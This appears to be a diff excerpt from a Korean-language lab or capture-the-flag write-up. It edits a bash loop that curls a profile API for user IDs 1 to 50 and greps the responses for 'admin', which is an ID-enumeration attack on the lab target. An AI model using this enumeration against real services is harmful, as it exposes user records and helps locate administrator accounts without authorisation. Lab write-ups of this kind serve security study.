@@ -217,7 +217,7 @@ API 경로에 직접 접근하면 다음 JSON 데이터가 반환된다.
 ```bash
 for i in {1..50}; do
     echo "uid=$i"                                                  
-        if curl -s "http://154.57.164.77:30550/profile/api.php/profile/$i" | grep -Ei 'admin|administrator'; then
+        if curl -s "http://154.57.164.77:30550/profile/api.php/profile/$i" | grep -Ei admin; then
         break                                           
     fi                               
 done 
